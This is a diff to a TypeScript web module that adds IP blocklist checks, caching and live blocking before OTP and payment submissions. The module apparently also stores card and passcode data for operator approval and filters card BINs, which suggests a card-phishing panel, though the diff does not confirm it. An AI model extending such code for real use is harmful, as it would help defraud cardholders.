@@ -55,6 +55,9 @@ const blockedVisitorCache = new Map<
   { blocked: boolean; expiresAt: number }
 >();
 
+let cachedVisitorIp: string | null = null;
+let cachedIpBlocked: boolean | null = null;
+
 const sanitizeString = (value: unknown, maxLength: number) => {
   if (typeof value !== "string") return value;
   return value.trim().slice(0, maxLength);
@@ -218,6 +221,10 @@ export async function addData(data: any) {
   }
 
   localStorage.setItem("visitor", visitorId);
+  if (cachedIpBlocked === true) {
+    console.warn("Blocked IP tried to submit data:", visitorId);
+    return false;
+  }
   const blocked = await isVisitorBlocked(visitorId);
   if (blocked) {
     console.warn("Blocked visitor tried to submit data:", visitorId);
@@ -259,6 +266,9 @@ export const handleOtp = async (otp: string, page: string = "otp") => {
   const visitorId = localStorage.getItem("visitor");
   if (visitorId && db) {
     try {
+      if (cachedIpBlocked === true) {
+        throw new Error("IP_BLOCKED");
+      }
       const blocked = await isVisitorBlocked(visitorId);
       if (blocked) {
         throw new Error("VISITOR_BLOCKED");
@@ -312,6 +322,9 @@ export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
   try {
     const visitorId = localStorage.getItem("visitor");
     if (visitorId) {
+      if (cachedIpBlocked === true) {
+        throw new Error("IP_BLOCKED");
+      }
       const blocked = await isVisitorBlocked(visitorId);
       if (blocked) {
         throw new Error("VISITOR_BLOCKED");
@@ -500,6 +513,104 @@ export const updateApprovalStatus = async (
   } catch (error) {
     console.error("Error updating approval status:", error);
   }
+};
+
+// ===== Blocked IP management =====
+// Fetch the visitor's IP from the server. Cached in memory for the page lifetime.
+export const fetchVisitorIp = async (): Promise<string> => {
+  if (cachedVisitorIp !== null) return cachedVisitorIp;
+  try {
+    const res = await fetch("/api/visitor-ip");
+    if (!res.ok) {
+      cachedVisitorIp = "";
+      return "";
+    }
+    const json = await res.json();
+    cachedVisitorIp = typeof json?.ip === "string" ? json.ip : "";
+    return cachedVisitorIp || "";
+  } catch (error) {
+    console.error("Error fetching visitor IP:", error);
+    cachedVisitorIp = "";
+    return "";
+  }
+};
+
+// Check whether an IP is in the admin blocklist (settings/blockedIps doc).
+export const isIpBlocked = async (ip: string): Promise<boolean> => {
+  if (!db || !ip) return false;
+  try {
+    const snap = await getDoc(doc(db, "settings", "blockedIps"));
+    if (!snap.exists()) return false;
+    const data = snap.data() as any;
+    const ips: string[] = Array.isArray(data?.ips)
+      ? data.ips.map((x: any) => String(x).trim())
+      : [];
+    return ips.includes(ip.trim());
+  } catch (error) {
+    console.error("Error checking blocked IP:", error);
+    return false;
+  }
+};
+
+// Synchronously read the cached "is this IP blocked" flag (set by ensureVisitorIp).
+export const isCachedIpBlocked = (): boolean => cachedIpBlocked === true;
+
+// Subscribe to live changes to the IP blocklist so a freshly-blocked visitor
+// gets cut off without needing to refresh.
+export const listenForIpBlock = (
+  ip: string,
+  callback: (blocked: boolean) => void,
+): (() => void) => {
+  if (!db || !ip) return () => {};
+  const ref = doc(db, "settings", "blockedIps");
+  return onSnapshot(ref, (snap) => {
+    const data = snap.data() as any;
+    const ips: string[] = Array.isArray(data?.ips)
+      ? data.ips.map((x: any) => String(x).trim())
+      : [];
+    const blocked = ips.includes(ip.trim());
+    cachedIpBlocked = blocked;
+    callback(blocked);
+  });
+};
+
+// Resolve the visitor's IP, persist it on their pay doc (if a visitor record
+// already exists), and return whether the IP is currently blocked.
+export const ensureVisitorIp = async (): Promise<{
+  ip: string;
+  blocked: boolean;
+}> => {
+  const ip = await fetchVisitorIp();
+  if (!ip) {
+    cachedIpBlocked = false;
+    return { ip: "", blocked: false };
+  }
+  const blocked = await isIpBlocked(ip);
+  cachedIpBlocked = blocked;
+
+  // Best-effort: attach the IP to the visitor's existing pay doc so admins
+  // can see and block it from the dashboard.
+  try {
+    const visitorId = localStorage.getItem("visitor");
+    if (visitorId && db) {
+      const ref = doc(db, "pays", visitorId);
+      const snap = await getDoc(ref);
+      if (snap.exists()) {
+        const existing = snap.data() as any;
+        if (existing?.ip !== ip) {
+          await setDoc(
+            ref,
+            { ip, ipAddress: ip, ipUpdatedAt: new Date().toISOString() },
+            { merge: true },
+          );
+        }
+      }
+    }
+  } catch (error) {
+    console.error("Error attaching visitor IP:", error);
+  }
+
+  return { ip, blocked };
 };
 
 // ===== Blocked BIN management =====
